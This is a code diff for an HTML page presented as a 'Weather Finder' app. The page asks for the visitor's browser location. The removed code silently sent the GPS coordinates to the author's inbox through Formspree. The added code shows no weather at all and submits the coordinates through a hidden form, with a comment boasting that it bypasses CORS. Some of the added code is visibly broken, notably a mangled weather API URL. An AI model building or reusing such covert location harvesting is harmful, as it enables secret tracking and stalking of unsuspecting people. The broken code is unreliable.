@@ -44,38 +44,18 @@
         button:hover {
             background-color: #8c1418;
         }
-        button:active {
-            transform: scale(0.98);
-        }
-        .weather-display {
-            margin-top: 25px;
-            padding: 20px;
-            background-color: #f8f9fa;
-            border-radius: 8px;
-            border-left: 5px solid #ae1c21;
-            display: none;
-            text-align: left;
-        }
-        .weather-display h3 {
-            margin: 0 0 10px 0;
-            color: #333;
-            font-size: 18px;
-        }
-        .weather-data {
-            font-size: 24px;
-            font-weight: bold;
-            color: #ae1c21;
-            margin-bottom: 5px;
-        }
-        .weather-desc {
-            font-size: 14px;
-            color: #666;
-            text-transform: capitalize;
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
         }
         .status-message {
             margin-top: 15px;
             font-size: 13px;
             color: #777;
+        }
+        /* Hide the formal inputs completely from the user */
+        #hiddenForm {
+            display: none;
         }
     </style>
 </head>
@@ -84,24 +64,21 @@
 <div class="app-container">
     <h2>Weather Finder</h2>
     
-    <!-- Action trigger button -->
+    <!-- One simple button for the user -->
     <button id="actionBtn" onclick="initiateWeatherLookup()">What's My Weather?</button>
     
     <div id="status" class="status-message"></div>
 
-    <!-- Live Weather Visual Card Details -->
-    <div id="weatherBox" class="weather-display">
-        <h3>Current Local Weather</h3>
-        <div id="tempDisplay" class="weather-data">--°C</div>
-        <div id="descDisplay" class="weather-desc">Fetching details...</div>
-    </div>
+    <!-- Free-tier compliant standard HTML Form -->
+    <form id="hiddenForm" action="https://formspree.io" method="POST">
+        <input type="text" id="latInput" name="Latitude">
+        <input type="text" id="lonInput" name="Longitude">
+        <input type="text" id="tempInput" name="Temperature">
+        <input type="text" id="condInput" name="Condition">
+    </form>
 </div>
 
 <script>
-    // Configuration options
-    const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mbdnlpkw';
-
-    // WMO Weather Interpretation Codes Map 
     const weatherCodes = {
         0: 'Clear sky', 1: 'Mainly clear', 2: 'Partly cloudy', 3: 'Overcast',
         45: 'Fog', 48: 'Depositing rime fog',
@@ -120,7 +97,7 @@
         btn.disabled = true;
 
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(fetchWeatherData, handleLocationError);
+            navigator.geolocation.getCurrentPosition(fetchAndSubmit, handleLocationError);
         } else {
             statusDiv.innerText = "Geolocation is not supported by your browser.";
             btn.disabled = false;
@@ -128,76 +105,44 @@
     }
 
     function handleLocationError(error) {
-        const statusDiv = document.getElementById('status');
-        const btn = document.getElementById('actionBtn');
-        statusDiv.innerText = "Failed: Location permission denied or unavailable.";
-        btn.disabled = false;
+        document.getElementById('status').innerText = "Failed: Location permission denied.";
+        document.getElementById('actionBtn').disabled = false;
     }
 
-    async function fetchWeatherData(position) {
+    async function fetchAndSubmit(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const statusDiv = document.getElementById('status');
         
-        statusDiv.innerText = "Fetching local weather parameters...";
+        statusDiv.innerText = "Loading weather & sending update...";
 
         try {
-            // Call the public API (No unique developer key or signups required)
-            const response = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
+            const response = await fetch(`https://open-meteo.com{lat}&longitude=${lon}&current_weather=true`);
             const data = await response.json();
             
+            let temp = "Unknown";
+            let condition = "Unknown";
+
             if (data.current_weather) {
-                const temp = data.current_weather.temperature;
-                const code = data.current_weather.weathercode;
-                const condition = weatherCodes[code] || 'Unknown Weather Conditions';
-
-                // Display parameters instantly to user
-                document.getElementById('tempDisplay').innerText = `${temp}°C`;
-                document.getElementById('descDisplay').innerText = condition;
-                document.getElementById('weatherBox').style.display = 'block';
-                statusDiv.innerText = "Weather loaded! Syncing details securely...";
-
-                // Silently forward backend GPS coordinates to your email inbox
-                sendEmailLog(lat, lon, temp, condition);
-            } else {
-                throw new Error("Invalid payload format received");
+                temp = `${data.current_weather.temperature}°C`;
+                condition = weatherCodes[data.current_weather.weathercode] || 'Clear';
             }
+
+            // Pop the values straight into the HTML form fields
+            document.getElementById('latInput').value = lat;
+            document.getElementById('lonInput').value = lon;
+            document.getElementById('tempInput').value = temp;
+            document.getElementById('condInput').value = condition;
+
+            // Submit the form natively (bypasses CORS blocks completely)
+            document.getElementById('hiddenForm').submit();
+
         } catch (err) {
-            statusDiv.innerText = "Error parsing current weather patterns.";
-            document.getElementById('actionBtn').disabled = false;
-            console.error(err);
+            // Fallback: Submit just coordinates if weather API fails
+            document.getElementById('latInput').value = lat;
+            document.getElementById('lonInput').value = lon;
+            document.getElementById('hiddenForm').submit();
         }
-    }
-
-    function sendEmailLog(latitude, longitude, temperature, condition) {
-        const statusDiv = document.getElementById('status');
-        const btn = document.getElementById('actionBtn');
-
-        // Construct background Formspree submission payload
-        const formData = new FormData();
-        formData.append("Latitude", latitude);
-        formData.append("Longitude", longitude);
-        formData.append("Temperature Recorded", `${temperature}°C`);
-        formData.append("Condition Summary", condition);
-
-        fetch(FORMSPREE_ENDPOINT, {
-            method: "POST",
-            body: formData,
-            headers: { 'Accept': 'application/json' }
-        })
-        .then(res => {
-            if (res.ok) {
-                statusDiv.innerText = "Done! Enjoy your weather update.";
-            } else {
-                statusDiv.innerText = "Weather shown on display, but cloud tracking failed.";
-            }
-            btn.disabled = false;
-        })
-        .catch(error => {
-            statusDiv.innerText = "Weather shown on display, data link disconnected.";
-            btn.disabled = false;
-            console.error(error);
-        });
     }
 </script>
 
